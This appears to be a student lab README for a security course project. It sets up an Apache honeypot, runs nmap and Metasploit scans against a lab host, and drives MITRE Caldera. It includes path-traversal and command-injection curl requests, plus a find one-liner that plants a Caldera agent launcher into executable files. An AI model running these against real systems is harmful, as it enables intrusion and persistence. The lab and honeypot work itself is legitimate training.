# group9-344
ICS3444 project
To run apache2:
- sudo apt install apache2 -y.
- sudo systemctl start apache2


# Honeypot (honeyHTTPD) setup:
1- clone repo: Using command git clone https://github.com/bocajspear1/honeyhttpd.git

2- Navigate to the Directory honeyhttpd

3- intall vitual enviroment: sudo apt install python3-venv

4- create vitual enviroment: python3 -m venv venv

5- activate it: source venv/bin/activate

6- install dependencies: pip install -r requirements.txt

7- use this command to generate keys: Using command openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes

8- copy the config.json.default to config.json and add in it "key_path": "server.key" after "cert_path": "server.pem",
Then use start.py --config config.json to start the honeypot


# Kali Metasploitable commands:
1- "nmap -sV 192.168.56.104"

2- "sudo msfconsole"

3- "search apache"

4- choose a general service auxiliary/scanner/http/apache_userdir_enum

5- "set RHOSTS 192.168.56.104"

6- "use auxiliary/scanner/http/apache_userdir_enum"

7- "exploit"

# Caldera commands:
-clone to caldera: git clone https://github.com/mitre/caldera.git --recursive

-python3 server.py --insecure

-curl http://192.168.13.165:80

-curl http://192.168.13.165:80/../../../../etc/passwd

-curl "http://192.168.13.165:80/execute?cmd=ls"

-For excutable files: find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" ' \; | echo "complete"

-and more inner operations within Caldera ( not manual)


# Custom Scripts:
- nano /var/www/html/vulnerable_page.php
- create vunrable code
- use comprimizing code above ( victim scripts or honey scritps )
